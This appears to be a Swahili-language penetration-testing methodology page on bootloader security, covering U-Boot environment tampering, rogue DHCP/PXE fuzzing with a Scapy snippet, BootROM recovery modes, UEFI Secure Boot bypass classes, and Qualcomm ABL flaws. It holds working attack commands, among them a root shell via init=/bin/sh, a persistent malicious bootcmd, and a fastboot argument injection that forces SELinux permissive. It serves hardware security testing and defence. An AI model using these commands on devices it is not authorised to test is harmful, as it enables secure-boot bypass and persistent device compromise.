# Testing ya Bootloader

{{#include ../../banners/hacktricks-training.md}}

Hatua zifuatazo zinapendekezwa kwa kurekebisha mipangilio ya kuanzisha kifaa na kujaribu bootloader kama vile U-Boot na loaders za daraja la UEFI. Lenga kupata code execution ya mapema, kutathmini ulinzi wa signatures/rollback, na kutumia vibaya njia za recovery au network-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## Ufanisi wa haraka wa U-Boot na matumizi mabaya ya environment

1. Fikia interpreter shell
- Wakati wa boot, bonyeza kitufe kinachojulikana cha kusitisha (mara nyingi kitufe chochote, 0, space, au mfuatano maalum wa board) kabla ya `bootcmd` kutekelezwa ili kufungua prompt ya U-Boot.<sup>[[1]](#references)</sup>

2. Kagua hali ya boot na variables
- Commands muhimu:
- `printenv` (toa environment)
- `bdinfo` (taarifa za board, memory addresses)
- `help bootm; help booti; help bootz` (njia za kernel boot zinazotumika)
- `help ext4load; help fatload; help tftpboot` (loaders zinazopatikana)

3. Rekebisha boot arguments ili kupata root shell
- Ongeza `init=/bin/sh` ili kernel ifungue shell badala ya init ya kawaida:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot kutoka kwenye TFTP server yako
- Sanidi network na upakue kernel/fit image kutoka LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Dumisha mabadiliko kupitia environment
- Ikiwa env storage haijalindwa dhidi ya uandishi, unaweza kudumisha udhibiti:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Kagua variables kama `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` zinazoathiri njia za fallback. Thamani zilizosanidiwa vibaya zinaweza kuruhusu kuvunja boot mara kwa mara na kuingia kwenye shell.

6. Kagua features za debug/unsafe
- Tafuta: `bootdelay` > 0, `autoboot` ikiwa imezimwa, `usb start; fatload usb 0:1 ...` bila vikwazo, uwezo wa kutumia `loady`/`loads` kupitia serial, `env import` kutoka media isiyoaminika, na kernels/ramdisks zinazopakiwa bila signature checks.

7. Ujaribio wa U-Boot image/verification
- Ikiwa platform inadai kuwa na secure/verified boot yenye FIT images, jaribu images ambazo hazijasainiwa na zilizobadilishwa:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Kutokuwepo kwa `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` au tabia ya zamani ya `verify=n` mara nyingi huruhusu ku-boot payload yoyote.
- Usikomee kwenye matokeo rahisi ya allow/deny: utafiti wa hivi karibuni wa FIT ulionyesha kuwa verification path yenyewe inaweza kuwa attack surface ya pre-auth. Fanya negative-test ya FIT data iliyohifadhiwa nje (`data-offset`, `data-position`, `data-size`), signed configuration selection, `loadables`, na handling ya overlay / `extra-conf`.
- Ikiwa una source tree inayolingana, `test/vboot/vboot_test.sh` ni njia ya haraka ya kuiga FIT verification behaviour kwenye U-Boot sandbox kabla ya kugusa hardware halisi.<sup>[[10]](#references)</sup>

8. Standard Boot (`bootstd`), `extlinux`, na script bootflows
- Kwenye U-Boot builds za kisasa, `bootcmd` mara nyingi huwa wrapper ya Standard Boot. Hii inamaanisha kuwa media inayoweza kuandikwa, PXE, au SPI flash inaweza kuwa trust boundary halisi hata environment inayoonekana ikiwa salama.
- `extlinux` bootmeth hutafuta `extlinux/extlinux.conf` chini ya `/` na `/boot`; script bootmeth hutafuta `boot.scr.uimg` kwanza, kisha `boot.scr`. Kwenye network boot, jina la script linaweza kutoka kwa `boot_script_dhcp`.
- Commands muhimu za triage:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Abuse cases za kujaribu: USB/SD media inayodhibitiwa na attacker ikiwa mapema kwenye `boot_targets`, `/boot/extlinux/extlinux.conf` inayoweza kuandikwa, TFTP rogue inayotoa `boot.scr`, au script execution inayotumia SPI kupitia `script_offset_f`.
- Ikiwa platform inategemea FIT verification, hakikisha configurations zimesainiwa kwenye configuration level na si kwa kila image pekee; `required-mode=all` ina nguvu zaidi kuliko kukubali key moja tu kati ya keys zinazohitajika.

## Network-boot surface (DHCP/PXE) na servers rogue

9. PXE/DHCP parameter fuzzing
- U-Boot’s legacy BOOTP/DHCP handling imewahi kuwa na memory-safety issues. Kwa mfano, CVE‑2024‑42040 inaeleza memory disclosure kupitia majibu ya DHCP yaliyoundwa mahsusi, yanayoweza kuvuja bytes kutoka U-Boot memory kurudi kwenye network.<sup>[[4]](#references)</sup> Fanya exercise ya DHCP/PXE code paths kwa values ndefu kupita kiasi/za edge-case (option 67 bootfile-name, vendor options, file/servername fields) na angalia hangs/leaks.
- Scapy snippet ndogo ya ku-stress boot parameters wakati wa netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Pia thibitisha ikiwa PXE filename fields zinapitishwa kwenye shell/loader logic bila sanitization zinapounganishwa na OS-side provisioning scripts.

10. Ujaribio wa command injection kupitia rogue DHCP server
- Sanidi rogue DHCP/PXE service na ujaribu kuingiza characters kwenye filename au options fields ili kufikia command interpreters katika hatua za baadaye za boot chain. Metasploit’s DHCP auxiliary, `dnsmasq`, au custom Scapy scripts zinafaa. Hakikisha unatenga lab network kwanza.

## SoC ROM recovery modes zinazobatilisha boot ya kawaida

SoC nyingi hutoa BootROM "loader" mode inayokubali code kupitia USB/UART hata flash images zikiwa invalid. Ikiwa secure-boot fuses hazijachomwa, hii inaweza kutoa arbitrary code execution mapema sana kwenye chain.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) au `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` kusukuma na kuendesha custom U-Boot kutoka RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` au `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` kuweka loader na kupakia custom U-Boot.

Tathmini ikiwa kifaa kina secure-boot eFuses/OTP zilizochomwa. Ikiwa hazipo, BootROM download modes mara nyingi hupita verification yoyote ya kiwango cha juu (U-Boot, kernel, rootfs) kwa kutekeleza first-stage payload yako moja kwa moja kutoka SRAM/DRAM.

## UEFI/PC-class bootloaders: ukaguzi wa haraka

11. Ujaribio wa ESP tampering, rollback, na key-enrollment
- Mount EFI System Partition (ESP) na kagua loader components: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo paths.
- Toa hali ya Secure Boot na key databases kutoka OS inapowezekana:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Ikiwa platform iko kwenye Setup Mode, inakubali key enrollment isiyothibitishwa, au inasafirishwa ikiwa na test/default Platform Key (PKfail class), local admin au physical attacker anaweza ku-enroll KEK/db yake na kuifanya Secure Boot ionekane “enabled” huku aki-boot arbitrary EFI binaries.<sup>[[3]](#references)</sup>
- Jaribu ku-boot signed boot components zilizodowngrade au zinazojulikana kuwa vulnerable ikiwa Secure Boot revocations (dbx) si za sasa. Ikiwa platform bado inaamini shims/bootmanagers za zamani, mara nyingi unaweza kupakia kernel yako au `grub.cfg` kutoka ESP ili kupata persistence.

12. Ujaribio wa stale shim / SBAT / dbx revocation
- Shims za zamani zilizosainiwa na Microsoft na vendor forks bado zinaweza kutumika kama BYOVD-style bootkit path ikiwa revocations ni za zamani. Kwenye lab iliyotengwa, weka shim iliyo historically vulnerable kwenye ESP na ujaribu chainload `grubx64.efi` au kernel yako.<sup>[[11]](#references)</sup>
- Triage ya haraka:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Ikiwa shim bado ina-run licha ya kuwa kwenye revocation list, firmware/OS ina `dbx` updates za zamani au inaamini forked loader ambayo haikupokea SBAT protections za upstream.

13. Boot logo parsing bugs (LogoFAIL class)
- Firmware kadhaa za OEM/IBV zilikuwa vulnerable kwa image-parsing flaws kwenye DXE zinazochakata boot logos. Ikiwa attacker anaweza kuweka image iliyoundwa mahsusi kwenye ESP chini ya vendor-specific path (kwa mfano, `\EFI\<vendor>\logo\*.bmp`) na ku-reboot, code execution wakati wa early boot inaweza kuwezekana hata Secure Boot ikiwa enabled. Jaribu ikiwa platform inakubali logos zinazotolewa na user na ikiwa paths hizo zinaweza kuandikwa kutoka OS.<sup>[[2]](#references)</sup>


## Android/Qualcomm ABL + GBL (Android 16) trust gaps

Kwenye vifaa vya Android 16 vinavyotumia Qualcomm's ABL kupakia **Generic Bootloader Library (GBL)**, thibitisha ikiwa ABL **ina-authenticate** UEFI app inayopakia kutoka `efisp` partition. Ikiwa ABL inakagua tu **uwepo** wa UEFI app na haithibitishi signatures, write primitive kwenye `efisp` inakuwa **pre-OS unsigned code execution** wakati wa boot.<sup>[[6]](#references)[[7]](#references)</sup>

Ukaguzi wa vitendo na abuse paths:

- **efisp write primitive**: Unahitaji njia ya kuandika custom UEFI app kwenye `efisp` (root/privileged service, OEM app bug, recovery/fastboot path). Bila hii, GBL loading gap haiwezi kufikiwa moja kwa moja.<sup>[[6]](#references)</sup>
- **fastboot OEM argument injection** (ABL bug): Baadhi ya builds zinakubali tokens za ziada kwenye `fastboot oem set-gpu-preemption` na kuziongeza kwenye kernel cmdline. Hii inaweza kutumika kulazimisha permissive SELinux, na kuwezesha protected partition writes:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Ikiwa kifaa kimepatchiwa, command inapaswa kukataa arguments za ziada.<sup>[[5]](#references)[[6]](#references)</sup>
- **Bootloader unlock kupitia persistent flags**: Payload ya boot-stage inaweza kubadilisha persistent unlock flags (kwa mfano, `is_unlocked=1`, `is_unlocked_critical=1`) ili kuiga `fastboot oem unlock` bila OEM server/approval gates. Hii ni mabadiliko ya kudumu ya posture baada ya reboot inayofuata.<sup>[[6]](#references)</sup>

Maelezo ya defensive/triage:

- Thibitisha ikiwa ABL hufanya signature verification kwenye GBL/UEFI payload kutoka `efisp`. Ikiwa haifanyi hivyo, ichukulie `efisp` kama persistence surface yenye risk kubwa.
- Fuatilia ikiwa ABL fastboot OEM handlers zimepatchiwa **kuthibitisha argument counts** na kukataa tokens za ziada.<sup>[[8]](#references)[[9]](#references)</sup>

## Tahadhari za hardware

Kuwa mwangalifu unaposhughulika na SPI/NAND flash wakati wa early boot (kwa mfano, ku-ground pins ili kupita reads) na kila mara soma flash datasheet. Short zisizo na wakati sahihi zinaweza kuharibu kifaa au programmer.

## Notes na vidokezo vya ziada

- Jaribu `env export -t ${loadaddr}` na `env import -t ${loadaddr}` kuhamisha environment blobs kati ya RAM na storage; baadhi ya platforms huruhusu ku-import env kutoka removable media bila authentication.
- Kwa persistence kwenye Linux-based systems zinazo-boot kupitia `extlinux.conf`, kurekebisha `APPEND` line (kuingiza `init=/bin/sh` au `rd.break`) kwenye boot partition mara nyingi hutosha wakati hakuna signature checks zinazotekelezwa.
- Ikiwa target inatumia dual-slot / A/B updates, pitia anti-rollback na slot-desync techniques kwenye [firmware analysis overview](README.md) ili usikose trust gaps zinazohusu updater pekee nje ya bootloader yenyewe.
- Ikiwa userland inatoa `fw_printenv/fw_setenv`, thibitisha kuwa `/etc/fw_env.config` inalingana na env storage halisi. Offsets zilizosanidiwa vibaya hukuruhusu kusoma/kuandika MTD region isiyo sahihi.

## References

- [1] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [2] [Finding LogoFAIL: The dangers of image parsing during system boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [3] [PKfail: Untrusted Platform Keys Undermine Secure Boot on UEFI Ecosystem](https://www.binarly.io/blog/pkfail-untrusted-platform-keys-undermine-secure-boot-on-uefi-ecosystem)
- [4] [CVE-2024-42040 Detail](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [5] [Preempted: Unlocking Xiaomi via two unsanitized strings](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [6] [Qualcomm Snapdragon 8 Elite GBL exploit lets attackers unlock bootloaders](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [7] [Generic Bootloader (GBL) architecture](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [8] [QcomModulePkg: Fix propagation of untrusted input into kernel cmdline](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [9] [QcomModulePkg: add check for set-hw-fence-value command](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [10] [Unfit to boot: breaking U-Boot's FIT signature verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [11] [Vulnerability Note VU#616257 - Microsoft-signed UEFI shim bootloaders vulnerable to Secure Boot bypass](https://kb.cert.org/vuls/id/616257)

{{#include ../../banners/hacktricks-training.md}}
